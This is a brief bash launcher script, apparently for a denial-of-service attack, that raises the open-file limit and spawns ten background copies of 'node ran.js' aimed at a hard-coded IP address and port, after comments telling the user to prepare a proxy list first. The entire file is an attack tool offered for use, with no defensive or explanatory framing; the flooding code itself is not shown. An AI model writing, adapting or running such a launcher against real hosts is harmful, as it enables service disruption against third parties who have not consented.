#!/bin/bash
#
#  Please prepared proxies list at first.
#  And then change the command in atk_cmd
#  And change the process number
#  Lastly run this script
#
#the command you want to exec
atk_cmd="node ran.js http://95.211.208.171 22"

#number of process that you want
process=10


#change the system limit
ulimit -n 999999

echo Attack started
for ((i=1;i<=$process;i++))
do
  $atk_cmd >/dev/null &
  sleep 0.1
done
